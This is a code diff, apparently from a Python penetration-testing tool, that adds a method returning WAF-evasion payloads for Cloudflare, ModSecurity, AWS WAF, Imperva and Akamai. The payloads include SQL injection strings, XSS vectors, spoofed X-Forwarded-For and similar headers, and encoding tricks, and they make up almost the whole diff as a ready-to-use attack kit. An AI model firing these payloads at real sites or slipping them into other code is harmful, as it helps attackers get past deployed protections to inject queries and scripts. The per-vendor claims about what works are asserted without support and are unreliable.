@@ -464,9 +464,118 @@ class AdvancedWAFDetector:
             console.print(f"[*] Diferença: {time_diff:.2f}s")
         
         return self.timing_data
-    
+
+    def get_waf_bypass_strategies(self, waf_name: str) -> dict:
+        """Retorna estratégias de bypass conhecidas para um WAF específico.
+
+        Args:
+            waf_name: Nome do WAF detectado (ex: 'Cloudflare', 'ModSecurity').
+
+        Returns:
+            dict com keys 'description', 'sql_bypass', 'xss_bypass', 'headers', 'encoding'.
+        """
+        strategies = {
+            'Cloudflare': {
+                'description': 'Cloudflare faz análise de corpo; chunked encoding pode dividir payloads',
+                'sql_bypass': [
+                    "1'/**/OR/**/1=1--",           # Whitespace substituído por comentário
+                    "1'%0aOR%0a1=1--",              # LF como espaço
+                    "1' OR/**/ 1=1--",
+                    "1') OR ('1'='1",
+                ],
+                'xss_bypass': [
+                    "<ScRiPt>alert(1)</ScRiPt>",    # Case mixing
+                    "<img src=x onerror=alert`1`>", # Template literal evita parênteses
+                    "<%2Fscript><script>alert(1)</%2Fscript>",
+                ],
+                'headers': {'Transfer-Encoding': 'chunked'},
+                'encoding': 'url_double_encode',
+            },
+            'ModSecurity': {
+                'description': 'ModSecurity usa regras regex; comentários SQL MySQL/MSSQL contornam muitos padrões',
+                'sql_bypass': [
+                    "1' /*!OR*/ 1=1--",             # Inline comment com código MySQL
+                    "1'/*!50000OR*/1=1--",           # Versioned comment MySQL
+                    "1' OR 1=1--",
+                    "1\\'OR 1=1--",                  # Barra invertida para escape
+                    "1' %0bOR%0b 1=1--",             # Vertical tab como espaço
+                ],
+                'xss_bypass': [
+                    "<script/src='data:,alert(1)'>",
+                    "<svg/onload=alert(1)>",
+                    "<<script>alert(1)//<</script>",
+                ],
+                'headers': {'X-Originating-IP': '127.0.0.1'},
+                'encoding': 'html_entity',
+            },
+            'AWS WAF': {
+                'description': 'AWS WAF usa regras gerenciadas; Unicode normalization e HTTP parameter pollution são efetivos',
+                'sql_bypass': [
+                    "1' OR 1=1\u200b--",             # Zero-width space
+                    "1\u2018 OR 1=1--",              # Unicode left single quotation
+                    "1' OR+1=1--",
+                    "1';SELECT%091--",               # Tab como espaço (URL encoded)
+                ],
+                'xss_bypass': [
+                    "<\x00script>alert(1)</script>", # Null byte
+                    "<scr\x00ipt>alert(1)</script>",
+                    "<img src=&#x58;&#x53;&#x53; onerror=alert(1)>",
+                ],
+                'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
+                'encoding': 'unicode_normalization',
+            },
+            'Imperva': {
+                'description': 'Imperva/Incapsula é sensível a HTTP Parameter Pollution e codificações duplas',
+                'sql_bypass': [
+                    "id=1&id=1' OR 1=1--",          # HPP - parameter pollution
+                    "1' OR 0x313d31--",              # Hex encoding
+                    "1' OR 0b1=0b1--",               # Binary literals
+                ],
+                'xss_bypass': [
+                    "<details/open/ontoggle=alert(1)>",
+                    "<input onfocus=alert(1) autofocus>",
+                    "<video/src/onerror=alert(1)>",
+                ],
+                'headers': {},
+                'encoding': 'double_url_encode',
+            },
+            'Akamai': {
+                'description': 'Akamai usa ML + regex; case variation e charset tricks são efetivos',
+                'sql_bypass': [
+                    "1' oR '1'='1",                  # Mixed case
+                    "1' Or/**/1=1--",
+                    "1' OR%001=1--",                 # Null byte
+                ],
+                'xss_bypass': [
+                    "<Script>alert(1)</Script>",
+                    "<IMG SRC=javascript:alert('xss')>",
+                    "<img src=`javascript:alert(1)`>",
+                ],
+                'headers': {'Accept-Charset': 'utf-7'},
+                'encoding': 'utf7',
+            },
+        }
+
+        # Estratégias genéricas para WAFs não mapeados
+        generic = {
+            'description': 'Técnicas genéricas: whitespace alternativo, comentários, encoding',
+            'sql_bypass': [
+                "1'%09OR%091=1--",                   # Tab URL-encoded
+                "1' OR 1=1 LIMIT 1--",
+                "1' OR 1 LIKE 1--",
+            ],
+            'xss_bypass': [
+                "<svg onload=alert(1)>",
+                "'\"><img src=x onerror=alert(1)>",
+            ],
+            'headers': {},
+            'encoding': 'url_encode',
+        }
+
+        return strategies.get(waf_name, generic)
+
     def _test_bypass_techniques(self, verbose=False):
-        """Testa técnicas de bypass de WAF."""
+        """Testa técnicas de bypass de WAF (genérico + WAF-específico)."""
         if verbose:
             console.print("[*] Testando técnicas de bypass...")
         
